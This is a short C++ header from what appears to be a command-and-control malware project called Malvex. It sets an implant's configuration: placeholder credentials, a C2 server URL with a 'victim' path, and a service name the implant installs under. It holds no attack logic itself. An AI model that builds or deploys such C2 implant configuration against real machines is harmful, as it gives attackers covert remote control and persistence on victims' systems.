#pragma once

#include <ImplantConfig.hpp>

MALVEX_CONFIG_SECTION ImplantConfig config  = {
    .username="vicky",
    .password="victim",
    .default_timeout="5",
    .server_url="https://api.erarnitox.de:3000/victim",
    .service_name="malvex_implant",
    .service_desc="Malvex C2 Implant (written by Erarnitox)"
};